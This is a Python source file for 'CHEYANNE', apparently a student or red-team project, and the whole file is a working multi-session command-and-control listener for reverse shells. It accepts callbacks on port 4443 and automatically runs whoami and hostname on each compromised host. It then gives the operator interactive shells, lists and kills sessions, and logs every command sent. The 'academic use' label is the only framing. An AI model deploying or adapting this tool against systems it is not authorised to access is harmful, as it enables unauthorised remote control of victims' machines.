"""
vader_c2.py — CHEYANNE Multi-Client C2 Listener
=============================================
22DIV / george wu
Classification: UNCLASSIFIED // ACADEMIC USE ONLY

Multi-session reverse shell handler with connection logging.
Accepts multiple callbacks, manages sessions, logs everything.

Usage:
    python shell\\vader_c2.py                  (default 0.0.0.0:4443)
    python shell\\vader_c2.py 4443             (custom port)
    python shell\\vader_c2.py 4443 --bind 192.168.1.100

Console commands:
    sessions / ls          List active sessions
    interact <id> / use    Enter interactive shell
    kill <id>              Terminate session
    back                   Return to console from shell
    log                    Show connection history
    help                   Show commands
    exit                   Shutdown C2
"""

import socket
import sys
import os
import json
import threading
import time
import select
from datetime import datetime

if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    except Exception:
        os.environ.setdefault("PYTHONIOENCODING", "utf-8")

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
ROOT_DIR = os.path.dirname(SCRIPT_DIR)
LOG_DIR = os.path.join(ROOT_DIR, "reporting", "c2_logs")


class Session:
    def __init__(self, sid, conn, addr):
        self.id = sid
        self.conn = conn
        self.addr = addr
        self.ip = addr[0]
        self.port = addr[1]
        self.connected_at = datetime.now()
        self.alive = threading.Event()
        self.alive.set()
        self.hostname = ""
        self.username = ""
        self.recv_buf = []
        self.lock = threading.Lock()
        self.interactive = False
        self.recv_thread = None

    def tag(self):
        host = self.hostname or self.ip
        user = self.username
        if user and host:
            return f"{host}\\{user}"
        return host

    def age(self):
        delta = datetime.now() - self.connected_at
        mins = int(delta.total_seconds() / 60)
        if mins < 1:
            return f"{int(delta.total_seconds())}s"
        if mins < 60:
            return f"{mins}m"
        return f"{mins // 60}h{mins % 60}m"


class VaderC2:
    def __init__(self, bind_ip, bind_port):
        self.bind_ip = bind_ip
        self.bind_port = bind_port
        self.sessions = {}
        self.next_id = 1
        self.active_session = None
        self.running = True
        self.server = None

        os.makedirs(LOG_DIR, exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.log_path = os.path.join(LOG_DIR, f"c2_log_{ts}.jsonl")
        self.log_lock = threading.Lock()

    def log_event(self, event_type, session_id=None, data=None):
        entry = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "event": event_type,
        }
        if session_id is not None:
            entry["session_id"] = session_id
            s = self.sessions.get(session_id)
            if s:
                entry["remote_ip"] = s.ip
                entry["remote_port"] = s.port
                entry["hostname"] = s.hostname
                entry["username"] = s.username
        if data:
            entry["data"] = str(data)[:500]
        with self.log_lock:
            with open(self.log_path, "a") as f:
                f.write(json.dumps(entry) + "\n")

    def recv_loop(self, session):
        try:
            while session.alive.is_set():
                try:
                    session.conn.settimeout(0.5)
                    data = session.conn.recv(4096)
                    if not data:
                        break
                    decoded = data.decode(errors='replace')

                    if not session.hostname:
                        for line in decoded.split('\n'):
                            line = line.strip()
                            if '\\' in line and '>' in line:
                                prompt = line.rstrip('>')
                                parts = prompt.rsplit('\\', 1)
                                if len(parts) >= 1:
                                    path_parts = parts[0].split('\\')
                                    if len(path_parts) >= 3:
                                        session.username = path_parts[-1]

                    if session.interactive:
                        sys.stdout.write(decoded)
                        sys.stdout.flush()
                    else:
                        with session.lock:
                            session.recv_buf.append(decoded)

                except socket.timeout:
                    continue
                except (ConnectionResetError, ConnectionAbortedError, OSError):
                    break
        finally:
            session.alive.clear()
            status = "DISCONNECTED"
            self.log_event("disconnect", session.id)
            self.notify(f"\033[31m[-] Session #{session.id} ({session.tag()}) disconnected\033[0m")

    def accept_loop(self):
        self.server.settimeout(1.0)
        while self.running:
            try:
                conn, addr = self.server.accept()
                sid = self.next_id
                self.next_id += 1
                session = Session(sid, conn, addr)
                self.sessions[sid] = session

                session.recv_thread = threading.Thread(
                    target=self.recv_loop, args=(session,), daemon=True
                )
                session.recv_thread.start()

                self.log_event("connect", sid)
                self.notify(
                    f"\033[32m[+] Session #{sid} opened — "
                    f"{addr[0]}:{addr[1]}\033[0m"
                )

                time.sleep(1)
                conn.sendall(b"whoami\n")
                time.sleep(0.5)
                conn.sendall(b"hostname\n")

            except socket.timeout:
                continue
            except OSError:
                if self.running:
                    break

    def notify(self, msg):
        ts = datetime.now().strftime("%H:%M:%S")
        if self.active_session:
            sys.stdout.write(f"\n  [{ts}] {msg}\n")
            sys.stdout.flush()
        else:
            print(f"\n  [{ts}] {msg}")

    def cmd_sessions(self):
        active = {k: v for k, v in self.sessions.items() if v.alive.is_set()}
        dead = {k: v for k, v in self.sessions.items() if not v.alive.is_set()}

        if not self.sessions:
            print("  No sessions.")
            return

        print()
        print("  \033[36m  ID  Remote                       Status   Age     Info\033[0m")
        print("  \033[36m  ──  ──────                       ──────   ───     ────\033[0m")
        for sid, s in sorted(self.sessions.items()):
            status = "\033[32mALIVE\033[0m " if s.alive.is_set() else "\033[31mDEAD\033[0m  "
            remote = f"{s.ip}:{s.port}"
            info = s.tag()
            print(f"    {sid:<4}{remote:<29}{status}  {s.age():<8}{info}")
        print()
        print(f"  Active: {len(active)}  |  Dead: {len(dead)}  |  Total: {len(self.sessions)}")
        print()

    def cmd_interact(self, sid):
        if sid not in self.sessions:
            print(f"  [!] Session #{sid} not found")
            return
        s = self.sessions[sid]
        if not s.alive.is_set():
            print(f"  [!] Session #{sid} is dead")
            return

        self.active_session = s
        s.interactive = True
        print(f"\n  \033[32m[*] Interacting with session #{sid} ({s.tag()})\033[0m")
        print(f"  \033[33m[*] Type 'back' to return to console\033[0m\n")

        with s.lock:
            if s.recv_buf:
                for chunk in s.recv_buf:
                    sys.stdout.write(chunk)
                sys.stdout.flush()
                s.recv_buf.clear()

        try:
            while s.alive.is_set():
                try:
                    cmd = input()
                except EOFError:
                    break

                if cmd.strip().lower() == 'back':
                    break

                if not s.alive.is_set():
                    print("  [!] Session died")
                    break

                self.log_event("command", sid, cmd)
                try:
                    s.conn.sendall((cmd + "\n").encode())
                except (BrokenPipeError, ConnectionResetError, OSError):
                    print("  [!] Connection lost")
                    break

        except KeyboardInterrupt:
            print("\n  [*] Returning to console...")

        s.interactive = False
        self.active_session = None
        print(f"\n  \033[36m[*] Back to CHEYANNE C2 console\033[0m\n")

    def cmd_kill(self, sid):
        if sid not in self.sessions:
            print(f"  [!] Session #{sid} not found")
            return
        s = self.sessions[sid]
        s.alive.clear()
        try:
            s.conn.shutdown(socket.SHUT_RDWR)
        except Exception:
            pass
        s.conn.close()
        self.log_event("killed", sid)
        print(f"  [*] Session #{sid} terminated")

    def cmd_log(self):
        if not os.path.exists(self.log_path):
            print("  No log entries.")
            return
        print(f"\n  \033[36m── Connection Log: {os.path.basename(self.log_path)} ──\033[0m\n")
        with open(self.log_path) as f:
            for line in f:
                try:
                    e = json.loads(line)
                    ts = e.get("timestamp", "?")
                    ev = e.get("event", "?")
                    sid = e.get("session_id", "")
                    ip = e.get("remote_ip", "")
                    data = e.get("data", "")
                    sid_str = f"#{sid}" if sid else ""
                    if ev == "command":
                        print(f"    {ts} | {sid_str:>4} | CMD: {data}")
                    else:
                        print(f"    {ts} | {sid_str:>4} | {ev.upper():<12} | {ip}")
                except json.JSONDecodeError:
                    pass
        print()

    def cmd_help(self):
        print("""
  \033[36m── CHEYANNE C2 Console Commands ──\033[0m

    sessions / ls         List all sessions
    interact <id> / use   Enter interactive shell
    kill <id>             Terminate session
    log                   Show connection history
    back                  Return from interactive session
    help                  Show this help
    exit / quit           Shutdown C2
""")

    def banner(self):
        print()
        print("  \033[36m╔══════════════════════════════════════════════════════╗")
        print("  ║  CHEYANNE C2 — Multi-Client Command & Control       ║")
        print("  ║  22DIV / george wu                                   ║")
        print("  ╚══════════════════════════════════════════════════════╝\033[0m")
        print(f"  \033[36m│\033[0m  Bind:    {self.bind_ip}:{self.bind_port}")
        print(f"  \033[36m│\033[0m  Log:     {self.log_path}")
        print(f"  \033[36m│\033[0m  Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"  \033[36m╘══════════════════════════════════════════════════════\033[0m")
        print()
        print(f"  \033[32m[*] Listening for callbacks on {self.bind_ip}:{self.bind_port}\033[0m")
        print(f"  \033[33m[*] Type 'help' for commands\033[0m")
        print()

    def run(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            self.server.bind((self.bind_ip, self.bind_port))
        except OSError as e:
            print(f"\n  \033[31m[!] Bind failed: {e}\033[0m")
            sys.exit(1)
        self.server.listen(10)

        self.banner()
        self.log_event("c2_start", data=f"{self.bind_ip}:{self.bind_port}")

        accept_thread = threading.Thread(target=self.accept_loop, daemon=True)
        accept_thread.start()

        try:
            while self.running:
                try:
                    raw = input("  \033[36mcheyanne>\033[0m ")
                except (EOFError, KeyboardInterrupt):
                    print()
                    break

                parts = raw.strip().split()
                if not parts:
                    continue

                cmd = parts[0].lower()
                args = parts[1:]

                if cmd in ("sessions", "ls"):
                    self.cmd_sessions()
                elif cmd in ("interact", "use"):
                    if not args:
                        print("  Usage: interact <session_id>")
                        continue
                    try:
                        self.cmd_interact(int(args[0]))
                    except ValueError:
                        print("  [!] Invalid session ID")
                elif cmd == "kill":
                    if not args:
                        print("  Usage: kill <session_id>")
                        continue
                    try:
                        self.cmd_kill(int(args[0]))
                    except ValueError:
                        print("  [!] Invalid session ID")
                elif cmd == "log":
                    self.cmd_log()
                elif cmd == "help":
                    self.cmd_help()
                elif cmd in ("exit", "quit"):
                    break
                else:
                    print(f"  [!] Unknown command: {cmd}")

        except KeyboardInterrupt:
            print()

        self.running = False
        self.log_event("c2_stop")
        print("\n  [*] Shutting down CHEYANNE C2...")
        for sid, s in self.sessions.items():
            s.alive.clear()
            try:
                s.conn.shutdown(socket.SHUT_RDWR)
            except Exception:
                pass
            s.conn.close()
        self.server.close()
        print(f"  [*] Log saved: {self.log_path}")
        print(f"  [*] Total sessions: {len(self.sessions)}")


def main():
    bind_ip = "0.0.0.0"
    port = 4443

    i = 1
    while i < len(sys.argv):
        if sys.argv[i] == "--bind" and i + 1 < len(sys.argv):
            bind_ip = sys.argv[i + 1]
            i += 2
        else:
            try:
                port = int(sys.argv[i])
            except ValueError:
                pass
            i += 1

    c2 = VaderC2(bind_ip, port)
    c2.run()


if __name__ == "__main__":
    main()
